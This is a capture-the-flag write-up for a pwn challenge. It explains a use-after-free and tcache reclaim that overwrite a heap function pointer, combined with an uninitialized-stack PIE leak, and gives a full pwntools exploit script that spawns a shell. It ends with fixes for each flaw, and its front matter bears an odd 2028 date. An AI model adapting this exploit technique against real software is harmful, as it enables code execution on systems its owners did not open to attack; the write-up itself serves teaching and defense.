---
layout: post
title: "Trick or Deal"
date: 2028-02-01 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, use-after-free, tcache, info-leak, pie-bypass, partial-overwrite, glibc, heap]
---

## Overview

Trick or Deal is a Medium Pwn challenge — a 64-bit binary (glibc 2.31, **Full RELRO +
stack canary + NX + PIE**) modelling an "intergalactic weapon black market" menu. Despite
every mitigation being enabled, the whole thing falls to a
[use-after-free](https://cwe.mitre.org/data/definitions/416.html) on a heap object that
holds a function pointer. With Full RELRO there is no GOT to overwrite, so the control-flow
primitive is that in-heap pointer — and PIE is defeated cleanly by an
[uninitialized-stack read](https://cwe.mitre.org/data/definitions/457.html) that leaks the
image base.

## The technique

At startup the program builds its "storage" object on the heap and, crucially, stores a
**function pointer inside that chunk**:

```c
storage = malloc(0x50);
strcpy(storage, weapons);        // 67 bytes of weapon names
*(storage + 0x48) = &printStorage;   // callback embedded in the heap object
```

Menu option **[1] See the Weaponry** then calls that pointer *indirectly*:

```asm
mov rax, [storage]
mov rdx, [rax+0x48]
call rdx                 ; call *(storage+0x48)
```

Three flaws combine:

1. **PIE leak (uninitialized stack)** — option **[2] Buy** does `read(0, buf, 0x47)` into a
   72-byte stack buffer that was **never zeroed**, then `fprintf(stdout, "... %s", buf)`.
   `read()` does not NUL-terminate, so `%s` walks *past* your input into stale stack memory
   that still holds a saved `&_start`. Subtract the symbol offset → the randomized load base.
2. **Use-after-free** — option **[4] Try to Steal** runs `free(storage)` but never nulls
   the global, leaving a dangling pointer.
3. **Attacker-controlled reclaim + write** — option **[3] Make an Offer** does
   `malloc(user_size)` then `read(0, offer, user_size)`. Ask for size 80 (the same tcache
   bin, `0x60`, as the freed `0x50` chunk) and the LIFO tcache hands back the *just-freed*
   storage chunk, so the `read` writes straight over the live object — including the
   embedded callback.

The win is `unlock_storage()`, which runs `system("sh")`. It is not reachable from the
menu — but the indirect `call` through the corrupted object *is* the reach. With the leaked
base you write the **full** `&unlock_storage` over `+0x48` and press `1`.

### A tempting trap: the "no-leak" partial overwrite

It is very tempting to skip the leak entirely. PIE randomizes the load base at page
granularity, so the low 12 *bits* of any address are the fixed in-binary offset:

```
&printStorage    = base + 0x0be6
&unlock_storage  = base + 0x0eff
```

The two functions differ only in the low 12 bits, so — the reasoning goes — a two-byte
`p16(0x0eff)` overwrite should flip one into the other with no ASLR break. **It does not.**
A page-aligned base only zeroes bits 0–11, **not** bits 12–15 — ASLR randomizes bit 12 and
up. A `p16()` write spans the low **16** bits, and bits 12–15 of that word are PIE base
nibble-3. Writing `0x0eff` forces that nibble to `0`, so the jump only lands when
`base_nibble3 == 0` — a **1-in-16** gamble, not a certainty. Measured over 32 local runs it
succeeded **0 times**, versus 100% for the leak-based full-pointer overwrite. The correct
rule of thumb: *a k-byte partial overwrite is deterministic only if the two functions'
offsets agree on every bit above bit 8k*. Here even a single byte fails, so you need the
leak.

## Solution

Leak the base with option 2, then do the classic free → reclaim → overwrite → trigger:

```
[2] buy                        -> uninitialized-stack %s leaks a saved &_start -> PIE base
[4] steal                      -> free(storage), dangling pointer
[3] make an offer, size 80     -> malloc reclaims the freed chunk
    payload: b'\x00'*72 + p64(unlock_storage)   -> overwrite *(storage+0x48)
[1] see the weaponry           -> call *(storage+0x48) -> system("sh")
```

`solve.py`:

```python
#!/usr/bin/env python3
from pwn import *
import os, sys

CHALDIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "files", "challenge")
exe = os.path.join(CHALDIR, "trick_or_deal")
elf = context.binary = ELF(exe, checksec=False)
context.arch = "amd64"

io = remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) >= 3 else process([exe], cwd=CHALDIR)

# 1) PIE leak via buy()'s uninitialized stack buffer printed with %s
io.sendlineafter(b"do? ", b"2")
io.sendafter(b"want!!? ", b"A" * 54 + b"BB")            # marker just before the stale ptr
io.recvuntil(b"BB")
elf.address = u64(io.recvline().rstrip().ljust(8, b"\x00")) - elf.sym._start
assert elf.address & 0xfff == 0                          # page-aligned == good leak

# 2) UAF: free(storage), global left dangling
io.sendlineafter(b"do? ", b"4")

# 3) tcache first-fit: reclaim the storage chunk and overwrite the fn-ptr at +0x48
io.sendlineafter(b"do? ", b"3")
io.sendafter(b"(y/n): ", b"y")
io.sendlineafter(b"offer to be? ", b"80")                # bin 0x60 == freed storage chunk
io.sendafter(b"offer me? ", b"\x00" * 72 + p64(elf.sym.unlock_storage))

# 4) trigger the in-heap fn-ptr -> system("sh")
io.sendlineafter(b"do? ", b"1")
io.sendline(b"cat flag* /flag* 2>/dev/null")
io.interactive()
```

Running it against the live instance drops a shell and prints the flag:

```
python3 solve.py <ip> <port>
# [+] PIE base    : 0x55...000
# * Storage Door Opened *
# HTB{...}
```

## Why it worked

The single root cause is a `free()` that leaves a live pointer behind. Because the freed
chunk still holds a callback the program later invokes, and the tcache recycles that exact
chunk on the next same-bin allocation, the attacker's bytes *become* the callback. PIE is
the only thing standing between the UAF and a reliable win — and an uninitialized stack
buffer printed with `%s` hands over the image base for free, so the overwrite uses a full,
correct address every time instead of gambling on a partial write.

## Fix / defense

- **Null the pointer on free** (`free(storage); storage = NULL;`) — this alone kills the
  use-after-free.
- **Zero stack buffers before printing** and never `%s` a raw `read()` buffer — print exactly
  the byte count `read()` returned (`fwrite(buf, 1, n, stdout)`). That closes the info leak.
- Don't store call targets inside user-writable heap objects; dispatch through a fixed
  switch or a read-only table instead.
- Keep Full RELRO and the canary (already on) — but note that neither stops this bug; the
  real defenses are the dangling pointer, the leaky buffer, and the writable code pointer.
```
